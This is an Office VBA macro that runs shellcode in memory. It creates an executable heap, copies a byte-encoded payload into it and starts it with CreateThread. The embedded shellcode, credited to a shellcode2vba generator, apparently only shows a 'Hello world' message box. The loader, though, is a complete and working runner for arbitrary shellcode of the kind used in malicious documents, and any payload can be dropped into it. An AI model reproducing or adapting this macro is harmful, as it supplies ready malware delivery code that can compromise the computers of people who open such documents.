Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByVal sSource As String, ByVal lLength As Long)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As LongPtr) As LongPtr
Private Declare PtrSafe Function HeapCreate Lib "kernel32" (ByVal flOptions As Long, ByVal dwInitialSize As Long, ByVal dwMaximumSize As Long) As LongPtr
Private Declare PtrSafe Function HeapAlloc Lib "kernel32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As Long) As LongPtr

Public Sub myMacro()
    Dim sShellCode As String
    Dim hHeap As LongPtr
    Dim AllocH As LongPtr
    Dim run As LongPtr

    sShellCode = ShellCode()

    hHeap = HeapCreate(&H40000, 0, 0)
    AllocH = HeapAlloc(hHeap, &H8, Len(sShellCode))
    'MsgBox "Address: " & Hex(AllocH)

    RtlMoveMemory AllocH, sShellCode, Len(sShellCode)
    run = CreateThread(0, 0, AllocH, 0, 0, 0)
End Sub

' Shellcode below plus additional functions are generated with
' https://github.com/DidierStevens/DidierStevensSuite/blob/master/shellcode2vba.py
Private Function ParseBytes(strBytes) As String
    Dim aNumbers
    Dim sShellCode As String
    Dim iIter

    sShellCode = ""
    aNumbers = Split(strBytes)
    For iIter = LBound(aNumbers) To UBound(aNumbers)
        sShellCode = sShellCode + Chr(aNumbers(iIter))
    Next

    ParseBytes = sShellCode
End Function

Private Function ShellCode1() As String
    Dim sShellCode As String

    sShellCode = ""
    sShellCode = sShellCode + ParseBytes("72 131 236 40 72 131 228 240 72 141 21 102 0 0 0 72 141 13 82 0 0 0 232 158 0 0 0")
    sShellCode = sShellCode + ParseBytes("76 139 248 72 141 13 93 0 0 0 255 208 72 141 21 95 0 0 0 72 141 13 77 0 0 0 232 127")
    sShellCode = sShellCode + ParseBytes("0 0 0 77 51 201 76 141 5 97 0 0 0 72 141 21 78 0 0 0 72 51 201 255 208 72 141 21")
    sShellCode = sShellCode + ParseBytes("86 0 0 0 72 141 13 10 0 0 0 232 86 0 0 0 72 51 201 255 208 75 69 82 78 69 76 51 50")
    sShellCode = sShellCode + ParseBytes("46 68 76 76 0 76 111 97 100 76 105 98 114 97 114 121 65 0 85 83 69 82 51 50 46 68")
    sShellCode = sShellCode + ParseBytes("76 76 0 77 101 115 115 97 103 101 66 111 120 65 0 72 101 108 108 111 32 119 111 114")
    sShellCode = sShellCode + ParseBytes("108 100 0 77 101 115 115 97 103 101 0 69 120 105 116 80 114 111 99 101 115 115 0")
    sShellCode = sShellCode + ParseBytes("72 131 236 40 101 76 139 4 37 96 0 0 0 77 139 64 24 77 141 96 16 77 139 4 36 252")
    sShellCode = sShellCode + ParseBytes("73 139 120 96 72 139 241 172 132 192 116 38 138 39 128 252 97 124 3 128 236 32 58")
    sShellCode = sShellCode + ParseBytes("224 117 8 72 255 199 72 255 199 235 229 77 139 0 77 59 196 117 214 72 51 192 233")
    sShellCode = sShellCode + ParseBytes("167 0 0 0 73 139 88 48 68 139 75 60 76 3 203 73 129 193 136 0 0 0 69 139 41 77 133")
    sShellCode = sShellCode + ParseBytes("237 117 8 72 51 192 233 133 0 0 0 78 141 4 43 69 139 113 4 77 3 245 65 139 72 24")
    sShellCode = sShellCode + ParseBytes("69 139 80 32 76 3 211 255 201 77 141 12 138 65 139 57 72 3 251 72 139 242 166 117")
    sShellCode = sShellCode + ParseBytes("8 138 6 132 192 116 9 235 245 226 230 72 51 192 235 78 69 139 72 36 76 3 203 102")
    sShellCode = sShellCode + ParseBytes("65 139 12 73 69 139 72 28 76 3 203 65 139 4 137 73 59 197 124 47 73 59 198 115 42")
    sShellCode = sShellCode + ParseBytes("72 141 52 24 72 141 124 36 48 76 139 231 164 128 62 46 117 250 164 199 7 68 76 76")
    sShellCode = sShellCode + ParseBytes("0 73 139 204 65 255 215 73 139 204 72 139 214 233 20 255 255 255 72 3 195 72 131")
    sShellCode = sShellCode + ParseBytes("196 40 195")

    ShellCode1 = sShellCode
End Function

Private Function ShellCode() As String
    Dim sShellCode As String

    sShellCode = ""
    sShellCode = sShellCode + ShellCode1()

    ShellCode = sShellCode
End Function
